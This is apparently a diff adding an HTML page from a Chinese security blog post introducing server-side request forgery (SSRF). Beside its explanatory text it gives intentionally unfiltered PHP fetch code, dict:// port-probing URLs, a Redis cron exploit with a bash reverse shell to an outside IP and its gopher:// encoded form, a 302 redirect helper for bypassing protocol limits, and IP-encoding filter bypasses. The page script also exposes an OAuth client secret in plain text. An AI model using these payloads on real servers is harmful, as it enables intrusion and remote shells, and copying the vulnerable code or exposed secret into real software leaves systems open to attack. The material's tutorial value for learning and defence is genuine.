@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            初探ssrf
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/08/10/初探ssrf/"> 
+                    初探ssrf 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-10   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#索引"><span class="toc-list-text">索引</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#SSRF原理"><span class="toc-list-text">SSRF原理</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#cURL"><span class="toc-list-text">cURL</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#伪造请求"><span class="toc-list-text">伪造请求</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#SSRF分析"><span class="toc-list-text">SSRF分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#漏洞搭建"><span class="toc-list-text">漏洞搭建</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#file协议查看文件"><span class="toc-list-text">file协议查看文件</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#dict协议探测端口"><span class="toc-list-text">dict协议探测端口</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#Gopher协议攻击redis反弹shell"><span class="toc-list-text">Gopher协议攻击redis反弹shell</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#302跳转"><span class="toc-list-text">302跳转</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#SSRF挖掘"><span class="toc-list-text">SSRF挖掘</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#SSRF绕过"><span class="toc-list-text">SSRF绕过</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#IP地址转换绕过"><span class="toc-list-text">IP地址转换绕过</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#xip-io绕过"><span class="toc-list-text">xip.io绕过</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol>
+</div>
+            <div class="content">
+                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。</p>
+<p>危害有如下几个类型:</p>
+<p>内网端口扫描<br>内网Web应用指纹识别<br>通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器<br>读取本地文件<br>读取远程文件<br>攻击内网其他应用,如redis,从而反弹shell</p>
+<h2 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2><h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p>curl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、</p>
+<p>我们可以利用curl进行抓取网页内容</p>
+<h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
+<p>类似于这样的形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:port/ssrf.php?url=xxxx</span><br></pre></td></tr></table></figure>
+
+<p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
+<p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
+<h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line">$ch = curl_init(); </span><br><span class="line"></span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line">curl_exec($ch); </span><br><span class="line"></span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
+<p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</span><br></pre></td></tr></table></figure>
+
+<p>协议就算失效了，这种方法失败</p>
+<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>
+
+<p>服务端会执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22/info&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
+<p>探测3306端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/ssrf.php?url=dict://127.0.0.1:3306</span><br><span class="line">/info</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure>
+
+<p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+
+<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function curl($url)&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">// 限制为HTTPS、HTTP协议</span><br><span class="line">curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
+<p>302辅助跳转脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;schema&apos;];</span><br><span class="line">$ip     = $_GET[&apos;ip&apos;];</span><br><span class="line">$port   = $_GET[&apos;port&apos;];</span><br><span class="line">$query  = $_GET[&apos;query&apos;];</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;</span><br><span class="line"></span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=http://your vps&apos;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</span><br></pre></td></tr></table></figure>
+
+<p>注意是POST请求还是GET请求</p>
+<h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
+<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
+<h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a></p>
+<p><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></p>
+<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/08/10/初探ssrf/">https://hpdoger.cn/2018/08/10/初探ssrf/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">  (转载)基于 Token 的身份验证</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/08/08/Socket套接字编程学习/"> Socket套接字编程学习 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Fri Aug 10 2018 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
